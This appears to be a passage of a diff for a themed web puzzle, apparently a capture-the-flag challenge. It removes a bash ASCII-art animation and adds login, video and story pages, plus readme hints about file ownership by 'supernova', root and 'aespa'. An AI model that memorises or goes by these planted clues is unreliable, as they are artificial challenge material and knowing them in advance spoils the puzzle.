-▒░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░░░░░░░░░░░░░░░
-▒░░░░░ ░░░▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒░░░░░              ░░▒
-▒░░          ░ ░░░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒░░     ▒▓▓▓▓▓▒▒░░░░░░░▒▒
-▒░░░░░░░   ░ ▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▒▒ ░   ░░░▓▓▓▓▒▒▒░░░░░▒▒▒▒
-▒▒▒▒░░░░░░░░░▒▒▓▒▒░░░ ▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▓▓▓▒░░ ░░░░▒▒▒▒░░░░░░░░▒▒▒▒▒
-▒▒▒▒▒▒▒▒░░ ░░░░░░░░░░▒▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▓▒▒▒▒░░░░▒░░░░░░▒▒▒▒▒▒▒▒▒
-▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▓▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒'
-  '▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░░▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░░░
-▒░░░░▒░░▒▒▒▒░░░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-░░▒░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒░░░▒░░░░░░░░░░░░░░░
-▒░░░░░ ░░░▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒░░░░░  ░            ░░▒
-░░░         ░░ ░░░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒░     ▒▓▓▓▓▓▓▒▒░░░░░░▒▒▒
-▒░░░░░░░  ░ ░▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▒▒    ░░░▓▓▓▓▓▒▒▒░░░░░▒▒▒▒
-▒▒▒▒░░░░░░░ ▒▒▓▒▒▒░░░ ▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▓▓▓▒░░ ░░░▒▒▒▒▒▒░░░░░░░▒▒▒▒▒
-▒▒▒▒▒▒▒░░░░░░░░░░░░░░▒▒▓▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▒▒▒▒▒░░░░░░░░░░░▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▓▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒'
-  '▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░░▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░░░
-▒░░░░▒░░▒▒▒▒░░░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-░░▒░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒░░░▒░░░░░░░░░░░░░░░
-▒░░░░░ ░░░▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒░░░░░  ░            ░░▒
-░░░         ░░ ░░░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒░     ▒▓▓▓▓▓▓▒▒░░░░░░▒▒▒
-▒░░░░░░░  ░ ░▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▒▒    ░░░▓▓▓▓▓▒▒▒░░░░░▒▒▒▒
-▒▒▒▒░░░░░░░ ▒▒▓▒▒▒░░░ ▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▓▓▓▒░░ ░░░▒▒▒▒▒▒░░░░░░░▒▒▒▒▒
-▒▒▒▒▒▒▒░░░░░░░░░░░░░░▒▒▓▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▒▒▒▒▒░░░░░░░░░░░▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒'
-  '▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░░░
-▒░░░░▒░░▒▒░▒░░░░▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒░░░░░░░░░░░░░░░
-▒░░░░░ ░░░▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒░░░░░              ░░▒
-▒░░          ░ ░░░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒░     ▒▓▓▓▓▓▒▒░░░░░░░▒▒
-▒░░░░░░░   ░ ▒▒▒▒░░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▒▒ ░   ░░░▓▓▓▓▒▒▒░░░░░▒▒▒▒
-▒▒▒▒░░░░░░░░░▒▒▓▒▒░░░ ▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▒░  ░░░░▒▒▒▒░░░░░░░░▒▒▒▒▒
-▒▒▒▒▒▒▒▒░░░░░░░░░░░░░▒▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▓▒▒▒▒░░░░░░░░░░░▒▒▒▒▒▒▒▒▒
-▓▒▒▒▓▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒'
-  '▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░
-▒░░░░▒░░▒▒░▒░░░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░
-▒░░░░░░░░░░░▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒░░░░░             ░▒
-▒░░      ░▒▒▒░  ▒  ░░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒░░ ░░▒       ░░░░░░░▒▒
-▒░░░░░░░▒▒▒▒▒▒░░     ░▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒ ▒▒▒▓▓▓▒ ░░░ ▒░░░░░▒▒▒▒
-▒▒▒▒░░ ░░░▒▒▒▒▒░░░░░  ░▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▓▓▓▒░ ░░░░▒▒▒▒▒░░░░░░░░▒▒▒▒▒
-▒▒▒▒▒▒▒░░░░░░░░░░░░▒▒▒▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒
-▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒'
-  '▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░░░
-▒░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒░▒░▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░▒▒▒▒▒▒▒▒░░░▒░▒░░▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░
-▒░░░░░ ░  ░ ░░░▒░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒░░░░               ░▒
-▒░░      ░▒░   ░  ░░░▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒░░ ░░      ░░▒░░░░░░░▒▒
-▒░   ░░░░▒▒▒ ░░ ░░ ░ ▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒ ░▒▒▒░░░░░░░▒▒░░░░░▒▒▒▒
-▒▒▒▒░░░░░░▒▒▒▒  ░░░░░ ▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▓▓▓▒░ ░░░░░░░░▒░░░░░░░░▒▒▒▒▒
-▒▒▒▒▒▒░░░░░░░░░░░░░░░▒▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▓▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒'
-)
-
-for i in {1..3}; do
-  for frame in "${frames[@]}"; do
-      # clear
-      printf '\033[2J\033[H'
-      printf "%s\n" "$frame"
-      sleep 0.1   # adjust speed (seconds)
-  done
-done
-
----
 ./file-browser/readme.txt
 ---
 Welcome.
@@ -730,5 +988,437 @@ This directory is owned by the supernova user.
 
 Root does not own the application data.
 FTP content belongs to aespa and is stored separately.
+
+---
+./app/web/PortalOfSouls.html
+---
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PortalOfSouls</title>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <h2>PortalOfSouls</h2>
+
+  <input id="u" placeholder="user"><br>
+  <input id="p" type="password" placeholder="pass"><br>
+  <button onclick="login()">Enter</button>
+
+  <p id="msg"></p>
+
+  <script src="portal.js"></script>
+</body>
+</html>
+
+---
+./app/web/index.html
+---
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Video</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html,
+body {
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    background: #000;
+}
+
+video {
+    width: 100vw;
+    height: 100vh;
+    object-fit: cover;
+    display: block;
+}
+</style>
+</head>
+
+<body>
+
+<!-- Video must be muted to autoplay -->
+<video id="myVideo" controls autoplay muted autoplay playsinline width="600">
+  <source src="../media/welcome.mp4" type="video/mp4">
+</video>
+<!-- TODO add custom pic by end w our CT Finstructions  -->
+<script>
+  // Unmute the video on the first user interaction
+  document.body.addEventListener('click', function() {
+    var video = document.getElementById('myVideo');
+    video.muted = false;
+  }, { once: true });
+
+  const video = document.getElementById('myVideo');
+const maxLoops = 3; // Set your desired number of loops
+let currentLoop = 0;
+
+video.addEventListener('timeupdate', () => {
+  // Check if the video has reached the end
+  if (video.currentTime >= video.duration) {
+    currentLoop++;
+    
+    // Check if we've hit the loop limit
+    if (currentLoop >= maxLoops) {
+      video.pause();
+      // Remove the listener so it doesn't accidentally trigger again
+      // video.removeAttribute('loop'); 
+    } else {
+      // If not, replay it from the beginning
+      video.currentTime = 0;
+      video.play();
+    }
+  }
+});
+
+</script>
+
+</body>
+</html>
+
+<!-- TODO how to make this NOT show in html but pop up in network tab?  -->
+<!-- <script src="/scene1.js"></script> -->
+
+---
+./app/web/run.html
+---
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Run</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body, html {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background-color: #000;
+    }
+
+    /* Stays the absolute base background */
+    .bg-ningning {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover; 
+      z-index: 1;
+    }
+
+    /* The Center Stage: This matches Karina's aspect ratio perfectly */
+    .center-stage {
+      position: relative;
+      width: 100%;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 2;
+    }
+
+    /* Karina sits right in the center */
+    .fg-karina {
+      max-width: 100%;
+      max-height: 100%;
+      object-fit: contain; 
+      position: relative;
+      z-index: 4; /* On top of everything */
+    }
+
+    /* Winter pieces flank out from behind Karina's edges */
+    .mid-winter {
+      position: absolute;
+      top: 0;
+      width: 50%; /* Stretches outwards from the center */
+      height: 100%;
+      object-fit: cover;
+      z-index: 3; /* Between Ningning and Karina */
+    }
+
+    /* Aligns to the left of Karina's center line */
+    .winter-left {
+      right: 50%; /* Anchors right edge to screen middle, extending left */
+      object-position: right center;
+      mask-image: linear-gradient(to left, black 60%, transparent 100%);
+      -webkit-mask-image: linear-gradient(to left, black 60%, transparent 100%);
+    }
+
+    /* Aligns to the right of Karina's center line */
+    .winter-right {
+      left: 50%; /* Anchors left edge to screen middle, extending right */
+      object-position: left center;
+      mask-image: linear-gradient(to right, black 60%, transparent 100%);
+      -webkit-mask-image: linear-gradient(to right, black 60%, transparent 100%);
+    }
+  </style>
+</head>
+<body>
+
+  <img src="../media/WDA_Ningning.jpeg" alt="Ningning" class="bg-ningning">
+
+  <div class="center-stage">
+    <img src="../media/WDA_winter.webp" alt="Winter Left" class="mid-winter winter-left">
+    <img src="../media/WDA_winter.webp" alt="Winter Right" class="mid-winter winter-right">
+
+    <img src="../media/WDA_karina.jpeg" alt="Karina" class="fg-karina">
+  </div>
+
+</body>
+</html>
+
+---
+./app/web/scene1.html
+---
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000000;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            overflow: hidden;
+            font-family: 'Georgia', serif;
+        }
+
+        /* Container for everything */
+        .main-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100vw;
+            height: 100vh;
+            gap: 60px;
+            padding: 40px;
+        }
+
+        /* Text columns */
+        .text-column {
+            flex: 1;
+            max-width: 350px;
+            color: #ffffff;
+            font-size: 14px;
+            line-height: 1.8;
+            letter-spacing: 0.5px;
+            opacity: 0.8;
+            text-align: justify;
+            z-index: 5;
+        }
+
+        .text-left {
+            text-align: right;
+            padding-right: 20px;
+            border-right: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .text-right {
+            text-align: left;
+            padding-left: 20px;
+            border-left: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .text-column p {
+            margin-bottom: 12px;
+        }
+
+        .text-column .highlight {
+            color: #ff6b9d;
+            font-weight: bold;
+        }
+
+        /* Video container */
+        #video-container {
+            position: relative;
+            z-index: 10;
+            cursor: default;
+            flex-shrink: 0;
+        }
+
+        video {
+            max-width: 50vw;
+            max-height: 70vh;
+            border-radius: 12px;
+            box-shadow: 0 0 80px rgba(255, 107, 157, 0.2);
+            display: block;
+            cursor: default;
+        }
+
+        /* GIF that spawns on click */
+        .spawned-gif {
+            position: fixed;
+            pointer-events: none;
+            z-index: 999;
+            transform: translate(-50%, -50%);
+            animation: fadeOut 2s forwards;
+        }
+
+        @keyframes fadeOut {
+            0% {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(1.5);
+            }
+        }
+
+        /* Responsive */
+        @media (max-width: 1200px) {
+            .main-wrapper {
+                flex-direction: column;
+                gap: 30px;
+                padding: 20px;
+            }
+
+            .text-column {
+                max-width: 90%;
+                font-size: 13px;
+                text-align: center !important;
+                border: none !important;
+                padding: 10px !important;
+            }
+
+            .text-left {
+                border-right: none;
+                border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+                padding-bottom: 20px;
+            }
+
+            .text-right {
+                border-left: none;
+                border-top: 1px solid rgba(255, 255, 255, 0.1);
+                padding-top: 20px;
+            }
+
+            video {
+                max-width: 80vw;
+                max-height: 50vh;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .text-column {
+                font-size: 11px;
+                line-height: 1.6;
+                max-width: 95%;
+            }
+
+            .main-wrapper {
+                gap: 15px;
+                padding: 10px;
+            }
+
+            video {
+                max-width: 90vw;
+                max-height: 40vh;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        
+        <!-- LEFT TEXT - ENGLISH -->
+        <div class="text-column text-left">
+            <p>Some strange phenomenon has been happening lately. Did you notice? Ever since our <span class="highlight">æ</span> came back to the real world, it's like I don't know what's fake and what's real anymore.</p>
+            
+            <p>Wait — you're that artist student that compared the æ to that philosophical concept, right? <span class="highlight">L'existence précède l'essence.</span> That was so smart, 'cause the æ are people who magically spawned from our digital footprint like true AI, but they're not just our clones, they're learning to be themselves. I don't think they've been doing fine though, someone was attacked with some corrupted data overload and it's like our real world began to glitch.</p>
+            
+            <p>You really seemed to know what you were talking about. If there's anyone who can get to the root of this, <span class="highlight">I think it's you.</span></p>
+        </div>
+
+        <!-- VIDEO CENTER -->
+        <div id="video-container">
+            <video id="myVideo" controls autoplay loop>
+                <source src="strange_phenomenon_giselle.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+
+        <!-- RIGHT TEXT - PORTUGUESE -->
+        <div class="text-column text-right">
+            <p>Ultimamente, tem acontecido um fenômeno meio estranho. Você reparou? Desde que nossos <span class="highlight">æ</span> voltaram pro mundo real, é como se eu não soubesse mais o que é falso e o que é real.</p>
+            
+            <p>Espera — você é aquela estudante artista que comparou os æ àquele conceito filosófico, certo? <span class="highlight">A existência precede a essência.</span> Isso foi tão inteligente, porque os æ são pessoas que surgiram magicamente da nossa pegada digital tipo true AI, mas eles não são só nossos clones, eles estão aprendendo a ser eles mesmos. Só que acho que eles não estão muito bem não, alguém foi atacado com uma sobrecarga de dados corrompidos e parece que o nosso mundo real começou a dar glitch.</p>
+            
+            <p>Você parecia realmente saber do que tava falando. Se tem alguém que consegue chegar na raiz disso, <span class="highlight">acho que é você.</span></p>
+        </div>
+
+    </div>
+
+    <script>
+        const GIF_URL = 'media/SALTy_and_sweet.gif';
+
+        const video = document.getElementById('myVideo');
+        const videoContainer = document.getElementById('video-container');
+
+        document.addEventListener('click', function(event) {
+            const isClickOnVideo = videoContainer.contains(event.target);
+
+            if (isClickOnVideo) {
+                return;
+            }
+
+            spawnGif(event.clientX, event.clientY);
+        });
+
+        function spawnGif(x, y) {
